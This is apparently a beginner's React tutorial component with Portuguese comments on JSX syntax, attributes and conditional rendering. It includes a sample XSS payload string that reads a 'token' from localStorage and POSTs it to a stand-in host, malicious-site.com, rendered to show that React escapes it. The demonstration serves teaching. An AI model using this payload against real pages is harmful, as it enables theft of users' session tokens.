const maliciousScript = `
<script>
  const token = window.localStorage.getItem('token')
  fetch('https://malicious-site.com/get-token', {
   method: 'POST',
   body: {token}
  })

  console.log('sent')

</script>
`
//este é um componente funcional.  Todo componente precisa ser exportado pata que possamos utilizá-lo
export default function HelloWorld () {
    const name = 'Carlos'
    const title = <h1>Hello, {name}</h1>
    const index = 0
    //É importante ressaltar que a utilização das chaves é uma forma de utilizarmos uma expressão javascript dentro de um jsx.
    //apenas expressões javascript podem ser utilizadas dentro dessas chaves.  Um exemplo de expressão javascript, seria o if ternário.
    //O próprio jsx também é uma expressão.  Exemplo:  podemos alocar um jsx dentro de uma constante.
    //Um ponto muito legal do jsx é que ele impede ataques com códigos maliciosos como cross site scripting
    // O React já escapa as tentativas de injetar código javascript malicioso em nossas aplicações

    //Podemos também retornar um jsx de forma condicional, como a seguir:
    if(name === 'Carlos') {
        // O jsx é mais próximo do javascript que do html, logo, se tivermos que passar atributos como, por exemplo, o tabIndex 
        // , devemos faze-lo com uso do padrão camel case
        // Um atributo, podemos passar como uma String, ou como uma expressão, como no caso abaixo para o tabIndex
        // No caso do style, utilizamos chaves duplas.  Mas pq?  Perceba que as chaves mais externas representam a expressão e as mais internas
        // representam um objeto, que também é uma expressão.
        return <div>
            <h1 tabIndex={index} style= {{background: 'red'}}>{maliciousScript}</h1>
        </div>

    }

    return <div>
        {/* <h1>Hello, {name === 'Carlos' ? 'Caduzinho': name}!!!</h1> */}
        {title}
    </div>
}